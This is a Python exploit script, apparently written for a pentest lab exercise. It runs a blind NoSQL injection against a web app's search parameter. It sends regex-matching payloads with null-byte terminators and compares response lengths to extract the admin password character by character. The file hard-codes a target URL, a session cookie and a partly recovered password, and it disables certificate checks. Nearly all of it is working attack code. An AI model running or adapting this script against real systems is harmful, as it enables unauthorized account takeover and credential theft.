import requests
import urllib3
import re


def is_match(session, url, headers, pattern, false_body):
    response = session.get(
        url,
        params={"search": pattern},
        headers=headers,
        verify=False,
        timeout=10,
    )
    print(f"Trying payload: {pattern}")
    result = len(response.text) != len(false_body)
    print(f"Match result: {result}")
    return result


def build_payload(prefix, exact=False):
    escaped_prefix = re.escape(prefix)
    regex = f"^{escaped_prefix}$" if exact else f"^{escaped_prefix}.*$"
    return f"admin' && this.password.match(/{regex}/)\x00"


def brute_force_password(session, url, headers):
    charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-"
    false_response = session.get(
        url,
        params={"search": "admin' && this.password.match(/(?!)$/)\x00"},
        headers=headers,
        verify=False,
        timeout=10,
    )
    false_body = false_response.text
    password = "5b317d17-3ee3-486"

    # If a starting prefix is provided and already matches exactly, we're done.
    if password:
        if is_match(session, url, headers, build_payload(password, exact=True), false_body):
            print(f"Password found (start prefix): {password}")
            return password
    while True:
        found_next_char = False

        for char in charset:
            candidate = password + char

            if is_match(session, url, headers, build_payload(candidate, exact=False), false_body):
                if is_match(session, url, headers, build_payload(candidate, exact=True), false_body):
                    password = candidate
                    print(f"Password found: {password}")
                    return password

                password = candidate
                found_next_char = True
                break

        if not found_next_char:
            raise RuntimeError(f"No matching character found for prefix: {password!r}")

def exploit():
    
    url = "https://ptl-eeba7202b4f0-409b59356849.libcurl.me/"
    
    headers = {
        "Cookie": "rack.session=BAh7CEkiD3Nlc3Npb25faWQGOgZFVEkiRWJmYzRkNDBmNTUzOGVjNmU3ZTEw%0AMzA3Y2ViYzg0YjBlMTA1Yzc1OTUxNjY1YjgzYjk5Yzc4YTcxOTgxNTY5MjAG%0AOwBGSSIJY3NyZgY7AEZJIiVhNTA4ZWQ4MTYwZDdkMDQ5ZDkzMjQyYzRkMDc3%0ANjYzMwY7AEZJIg10cmFja2luZwY7AEZ7B0kiFEhUVFBfVVNFUl9BR0VOVAY7%0AAFRJIi0xZjM3OWIwNDllNzFmZTYwN2FmZjRmMGEzMThlNTQ2Nzk2NjFmZGY4%0ABjsARkkiGUhUVFBfQUNDRVBUX0xBTkdVQUdFBjsAVEkiLWRkMDY1ZWQyNjNj%0ANjdkNzk5Zjk0M2FiNmMzOWI1NWM1ZTAwOGNiYjUGOwBG%0A--bb6f9af202e59fba335b5a19888fcba79e17e077",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br"
    }
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    session = requests.Session()
    brute_force_password(session, url, headers)


if __name__ == "__main__":
    exploit()



